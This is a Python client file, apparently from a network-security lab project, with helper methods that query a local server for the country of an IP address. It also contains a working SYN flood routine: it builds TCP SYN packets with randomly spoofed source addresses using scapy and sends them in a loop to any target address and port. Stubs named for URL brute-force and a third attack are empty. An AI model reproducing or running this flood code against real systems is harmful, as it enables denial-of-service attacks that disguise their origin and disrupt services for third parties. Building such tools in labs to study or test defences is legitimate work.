from scapy.all import *
import requests
from scapy.layers.inet import IP, TCP

from server.server_requests.all_ips_in_country_request import AllIPsInCountryRequest
from server.server_requests.country_request import CountryRequest
from server.server_requests.server_request import ServerRequest

SERVER_URL = "http://127.0.0.1:8000"
GET_COUNTRY_OF_ADDRESS_URL = "/get_country"
GET_ALL_IPS_URL = "/get_all_ip_in_country"
GET_TOP_COUNTRIES_URL = "/get_top_countries"

NUMBER_OF_PACKETS = 10


class Client:
    def __send_post_request(self, url: str, request: ServerRequest) -> str:
        data = request.model_dump_json()
        response = requests.post(url, data=data)
        return response.content

    def __send_get_request(self, url: str) -> str:
        response = requests.get(url)
        return response.content

    def send_country_request(self, ip_address: str) -> str:
        request = CountryRequest(ip_address=ip_address)
        url = SERVER_URL + GET_COUNTRY_OF_ADDRESS_URL
        return self.__send_post_request(url, request)

    def send_get_all_addresses_in_country_request(self, country: str) -> str:
        request = AllIPsInCountryRequest(country=country)
        url = SERVER_URL + GET_ALL_IPS_URL
        return self.__send_post_request(url, request)

    def send_get_top_countries_request(self) -> str:
        url = SERVER_URL + GET_TOP_COUNTRIES_URL
        return self.__send_get_request(url)

    def __send_syn_packet(self, target_address: str, target_port: int):
        source_port = self.__random_int()
        source_seq = self.__random_int()
        window_size = self.__random_int()

        ip_packet = IP()
        ip_packet.src = self.__random_ip() # Spoofed Attack
        ip_packet.dst = target_address

        tcp_packet = TCP()
        tcp_packet.sport = source_port
        tcp_packet.dport = target_port
        tcp_packet.flags = "S"
        tcp_packet.seq = source_seq
        tcp_packet.window = window_size
        send(ip_packet / tcp_packet, verbose=0)

    def perform_syn_flood_attack(self, target_address: str, target_port: int, number_of_packets: int = NUMBER_OF_PACKETS):
        successful_requests = 0
        for packet in range(number_of_packets):
            try:
                self.__send_syn_packet(target_address, target_port)
                successful_requests += 1
                print(f"Done sending {packet} packets.")
            except Exception as e:
                print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
                break

    def perform_url_brute_force_attack(self, target_address: str, target_port: int):
        pass

    def perform_third_attack(self, target_address: str, target_port: int):
        pass

    def __random_ip(self) -> str:
        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        return ip

    def __random_int(self) -> int:
        x = random.randint(1000, 9000)
        return x
